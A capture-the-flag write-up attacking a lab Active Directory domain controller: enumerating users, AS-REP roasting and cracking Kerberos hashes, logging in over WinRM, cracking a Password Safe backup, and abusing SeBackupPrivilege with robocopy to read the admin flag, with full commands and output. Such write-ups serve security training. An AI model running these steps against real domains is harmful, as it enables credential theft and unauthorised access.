# B2R Hijack Solution

Challenge: Hijack

Difficulty: Medium

# Recon

Given a Windows Server 2019 that's acting as a domain controller in an Active Directory environment.
First thing to do is port/service scanning to see what we can exploit.

```
$ nmap -Pn -p- -T5 --min-rate=2000 192.168.203.135
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-25 20:22 -0500
Nmap scan report for 192.168.203.135
Host is up (0.00023s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49686/tcp open  unknown
49687/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49693/tcp open  unknown
49703/tcp open  unknown
49736/tcp open  unknown
MAC Address: 00:0C:29:10:32:FC (VMware)

Nmap done: 1 IP address (1 host up) scanned in 24.41 seconds
```

From the nmap output, we can see a whole bunch of services that are open. The common ports (HTTP 80, FTP 21, SMB 445, WinRM 5985) that are often vulnerable and exploited are tested first. I tested FTP and SMB with Null authentication/session and guest/anonymous using `smbclient` and just `ftp`, but nothing.
Since this is an AD environment, I tried to enumerate user accounts. This is only possible because port 445 is open despite blocking our null auth attempts. Older Win Servers use port 139, so RPC via that legacy port is also possible.

```
$ impacket-lookupsid anonymous@192.168.203.135 -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 192.168.203.135
[*] StringBinding ncacn_np:192.168.203.135[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2365254744-4264884539-3487886201
498: CYNX\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CYNX\Administrator (SidTypeUser)
501: CYNX\Guest (SidTypeUser)
502: CYNX\krbtgt (SidTypeUser)
512: CYNX\Domain Admins (SidTypeGroup)
513: CYNX\Domain Users (SidTypeGroup)
514: CYNX\Domain Guests (SidTypeGroup)
515: CYNX\Domain Computers (SidTypeGroup)
516: CYNX\Domain Controllers (SidTypeGroup)
517: CYNX\Cert Publishers (SidTypeAlias)
518: CYNX\Schema Admins (SidTypeGroup)
519: CYNX\Enterprise Admins (SidTypeGroup)
520: CYNX\Group Policy Creator Owners (SidTypeGroup)
521: CYNX\Read-only Domain Controllers (SidTypeGroup)
522: CYNX\Cloneable Domain Controllers (SidTypeGroup)
525: CYNX\Protected Users (SidTypeGroup)
526: CYNX\Key Admins (SidTypeGroup)
527: CYNX\Enterprise Key Admins (SidTypeGroup)
553: CYNX\RAS and IAS Servers (SidTypeAlias)
571: CYNX\Allowed RODC Password Replication Group (SidTypeAlias)
572: CYNX\Denied RODC Password Replication Group (SidTypeAlias)
1000: CYNX\DC01$ (SidTypeUser)
1101: CYNX\DnsAdmins (SidTypeAlias)
1102: CYNX\DnsUpdateProxy (SidTypeGroup)
1103: CYNX\r007 (SidTypeUser)
1104: CYNX\svc-ftp (SidTypeUser)
1105: CYNX\svc-ssh (SidTypeUser)
1106: CYNX\levy (SidTypeUser)
1107: CYNX\jenny (SidTypeUser)
1108: CYNX\misty (SidTypeUser)
1109: CYNX\lewis (SidTypeUser)
1110: CYNX\pria (SidTypeUser)
1111: CYNX\wang (SidTypeUser)
1112: CYNX\stalone (SidTypeUser)
1113: CYNX\sam (SidTypeUser)
1114: CYNX\kimmy (SidTypeUser)
1115: CYNX\mindy (SidTypeUser)
1116: CYNX\sshd (SidTypeUser)
1117: CYNX\IT-Team (SidTypeGroup)
1118: CYNX\HR-Team (SidTypeGroup)
1119: CYNX\Finance-Team (SidTypeGroup)
1120: CYNX\Sales-Team (SidTypeGroup)
1121: CYNX\Support-Team (SidTypeGroup)
1122: CYNX\Marketing-Team (SidTypeGroup)
1123: CYNX\Operations-Team (SidTypeGroup)
```

From the output, we can filter for the user (human) or service accounts. Put them into a list:

```
Administrator
Guest
krbtgt
DC01$
r007
svc-ftp
svc-ssh
levy
jenny
misty
lewis
pria
wang
stalone
sam
kimmy
mindy
sshd
```

Because we don't have any user passwords, we have to see if the user accounts are susceptible to any Kerberos vulnerabilities. Here I tried AS-REP Roasting using `impacket-GetNPUsers` to get the user hashes from the DC:

```
$ impacket-GetNPUsers cynx.local/ -usersfile full_users.txt -format john -dc-ip 192.168.203.135 -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User r007 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ftp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ssh doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$levy@CYNX.LOCAL:d3f0451da407e3326d9f4b1e899b5ab1$5654b4766b5e1031e129dbb9e92823d5b6a4d118d7717116fe4299ce81c76af2891929a3c0f0cb7582c1a9ffa2f505ea7deeb7465ebc313c732470011241de9b4e81bd8c1f05cb1ecb6a8bf4190b47dfd976955eaf844290c9985109187871616fec74de2181f50768ae135ac3ba719be9e0cf37b1edd0bff66e6ecc874f7ea7dec55c0a1c6dfb135ad8359fea302aec3ca1578d86788ae20b45797e3ae545a1a78b08a45385786e311e5bfbb68374bba124a7ab7a062348fce04158dba55488387fde4741333118c522feb011c81a0f00965f5aad3e35e640b34dd04cc7867b456839a5f1b0c0cf
[-] User jenny doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User misty doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$lewis@CYNX.LOCAL:4c4b1d03ad71cdb30f98e0b506caa30f$1aa1eb42166379c648ded791ae53446ac54bad03ae5ab1d29660098b9fba7a9c140bfcb470250eade22a59cd8ecd9d13d187e98be406346c904ef787a1731e57cf2a80407bbece57b07639698336198bcbf265380e6c5d5afe89342f16be10ddaffd0cef8d0cf3f928b7d619592778ef55e13df58626a6e4fae740e6d3f4f357ec295713592d0e30721e69e4e18a0753569cbe17c22f1f9f428fdd748baf1128f17bbefe25dc7f1a35d9b5794b92ffece2c00a86732a02e0b27b463964a82c4b8df0ced86e2a1ebe55b74092757a8c6825398c96028590e1058668ccab2df4599c41559d76461788
[-] User pria doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$wang@CYNX.LOCAL:3bf1f1bf5b1090d1a4a57facd5277c0f$d223f8c447d5d09758f35c752d8ecb30006da249232a756a7bca1fc0fc65ba326bf6ef03b3b0fc68dbf270b6580879254be03437c0a40f57d98f1b3848aa4bfd92ae4cebbd3a37a36991fd1f98009135c95f092e3444afda73b2dfaaf86a4ec3ea24edf1ec55960d246f776328a1dbec6216185c85fc6dd9f2fd6a69673beb456185a0ae1967617ce860e9992404460db8e0d415213fde4b4471cb154d6195c21521c99cc694086c7b514bc7ef499c425e9eac965d25791e5c9a2b41ed7dc355bff2cf8289f666f8b47c447e72063676b3b6ba882d8b29e585c2ef81a6c882e62e87a1e018ad1026
[-] User stalone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sam doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kimmy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mindy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sshd doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Cracking the hashes for levy, lewis, and wang using john. Only user `levy` had a crackable hash with the password `cassandra`.

```
$ john temp --wordlist=/usr/share/wordlists/rockyou.txt       
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cassandra        ($krb5asrep$levy@CYNX.LOCAL)     
1g 0:00:00:12 DONE (2026-02-25 20:55) 0.08090g/s 1160Kp/s 2321Kc/s 2321KC/s !SkicA!..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

# Initial Access

We can gain an initial foothold in the system by exploiting the open WinRM and authenticating as `levy` using `evil-winrm`. 

```
$ evil-winrm -i 192.168.203.137 -u levy -p cassandra
...
[truncated]
...
*Evil-WinRM* PS C:\Users\levy\Documents> whoami
cynx\levy
```

Crawl all the directories allowed to the user `levy`. Not many directories since `levy` doesn't have permission to view them. 

```
*Evil-WinRM* PS C:\Users\Administrator> dir
Access to the path 'C:\Users\Administrator' is denied.
At line:1 char:1
+ dir
+ ~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

# Data Exfiltration

Found a `C:\loot\backup.psafe3`.

```
*Evil-WinRM* PS C:\loot> dir


    Directory: C:\loot


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        12/4/2025   4:48 AM                Tools
-a----        12/4/2025   8:12 AM           1016 backup.psafe3
```

Parse the psafe file using `pwsafe`, but it is password-protected. So, we can crack it.

```
$ pwsafe2john backup.psafe3
backu:$pwsafe$*3*94f223cce649ccde31f54d71c7d99d6dc24b46761f0d5a205a6acbf22646e8b3*262144*cf1684fc224cb3c878b648765d5600cb4b83e227d6362fce21a8c750e0fb10b2

$ john psafe_hash.txt
backu:labeba
```

# Privilege Escalation

Password for the psafe file is `labeba`. We can parse using `pwsafe` with `$ pwsafe backup.psafe3`.

<img width="1607" height="831" alt="image" src="https://github.com/user-attachments/assets/814a9ab5-0044-421a-bda6-26c82fc3365c" />


Found 4 credentials in the backup.psafe3 file, but only 1 of them is a valid credential:

```
$ nxc winrm 192.168.203.137 -u 'stalone' -p '419b026286ea49b54b714540436607c0'
WINRM       192.168.203.137 5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:cynx.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.203.137 5985   DC01             [+] cynx.local\stalone:419b026286ea49b54b714540436607c0 (Pwn3d!)
```

We can then use this credential to remote into the machine via `evil-winrm`.

```
$ evil-winrm -i 192.168.203.137 -u stalone -p 419b026286ea49b54b714540436607c0
                                        
Evil-WinRM shell v3.9
*Evil-WinRM* PS C:\Users\stalone\Documents> whoami
\cynx\stalone
```

We can then recursively search the directory for the flag:

```
*Evil-WinRM* PS C:\Users> Get-ChildItem -Path C:\ -Filter flag.txt -Recurse -Force -ErrorAction SilentlyContinue | Select-Object FullName

FullName
--------
C:\Documents and Settings\Administrator\Desktop\flag.txt
C:\Users\Administrator\Desktop\flag.txt
```

We can navigate to both directories. This means that the user `stalone` DOES have admin privileges, but we're unable to actually read the flag directly.

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        12/4/2025   5:09 AM             28 flag.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
Access to the path 'C:\Users\Administrator\Desktop\flag.txt' is denied.
At line:1 char:1
+ type flag.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\flag.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

I tried changing the file permissions using `takeown` and `icacls`, but I don't have the permissions to do those.
So, I checked what permissions I had:

```
Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

I have `SeBackupPrivileges`, which lets me back up a file. Can exploit this to copy the flag and read it.

```
Evil-WinRM* PS C:\Users\Administrator\Desktop> mkdir C:\temp

    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/24/2026  11:33 PM                temp

Evil-WinRM* PS C:\Users\Administrator\Desktop> robocopy /b C:\Users\Administrator\Desktop C:\temp flag.txt

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Tuesday, February 24, 2026 11:33:00 PM
   Source : C:\Users\Administrator\Desktop\
     Dest : C:\temp\

    Files : flag.txt

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    C:\Users\Administrator\Desktop\
            New File                  28        flag.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :        28        28         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Tuesday, February 24, 2026 11:33:00 PM

Evil-WinRM* PS C:\Users\Administrator\Desktop> type C:\temp\flag.txt
CYNX{74k3_b4ck_wh47_is_0urs}
```


Flag: `CYNX{74k3_b4ck_wh47_is_0urs}`
